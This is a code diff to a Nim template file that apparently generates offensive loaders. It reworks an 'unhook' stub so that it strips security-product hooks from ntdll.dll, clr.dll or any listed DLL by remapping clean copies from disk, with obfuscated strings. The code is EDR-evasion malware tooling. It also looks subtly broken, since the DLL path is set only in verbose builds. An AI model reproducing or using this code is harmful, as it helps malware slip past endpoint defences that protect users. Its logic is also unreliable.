@@ -882,17 +882,30 @@ let DripAllocateStubSecond * = """
             return vmBaseAddress
 """
 
-let UnhookNtdllStub * = """
+let UnhookStub * = """
 
 
 
-    proc ntdllunhook(): bool =
+    proc unhook(dllName: string): bool =
         let low: uint16 = 0
         var processH = -1
+
+        if(dllName == obf("clr.dll")):
+            clrStart()
+            Sleep(2500)
+
         when defined(DInvoke):
-            var ntdllModule = MyGetModuleHandleA(obf("ntdll.dll"))
+            var ntdllModule = MyGetModuleHandleA(dllName)
         else:
-            var ntdllModule = GetModuleHandleA(obf("ntdll.dll"))
+            var ntdllModule = GetModuleHandleA(dllName)
+        if ntdllModule == 0:
+            when defined(verbose):
+                echo obf("Could not get handle for ") & dllName & obf(", loading it..")
+            when defined(DInvoke):
+                ntdllModule = MyLoadLibraryA(dllName)
+            else:
+                ntdllModule = LoadLibraryA(dllName)
+            
         var 
             mi : MODULEINFO
             ntdllBase : LPVOID
@@ -908,7 +921,15 @@ let UnhookNtdllStub * = """
         else:
             discard GetModuleInformation(processH, ntdllModule, cast[LPMODULEINFO](addr mi), cast[DWORD](sizeof(mi)))
         ntdllBase = mi.lpBaseOfDll
-        ntdllFile = getOsFileHandle(open(obf("C:\\windows\\system32\\ntdll.dll"),fmRead))
+
+        var dllCstring: cstring = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+        var dllPath: string
+        discard GetModuleFileNameA(ntdllModule, cast[LPSTR](dllCstring), DWORD(len(dllCstring)))
+        when defined(verbose):
+            dllPath = $dllCstring
+            echo obf("[*] Target DLL path: "), dllPath
+            
+        ntdllFile = getOsFileHandle(open(dllPath,fmRead))
         when defined(DInvoke):
             ntdllMapping = MyCreateFileMappingA(ntdllFile, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
         else:
@@ -1001,11 +1022,12 @@ let UnhookNtdllStub * = """
             discard FreeLibrary(ntdllModule)
         return true
 
+    # for each string in the sequence dllNames, call unhook
+    for dllName in dllNames:
+        var result = unhook(dllName)
+        when defined(verbose):
+            echo obf("[*] unhook ") & dllName  & fmt" : {bool(result)}"
 
-
-    var result = ntdllunhook()
-    when defined(verbose):
-        echo obf("[*] unhook Ntdll: ") & fmt"{bool(result)}"
 
 """
 
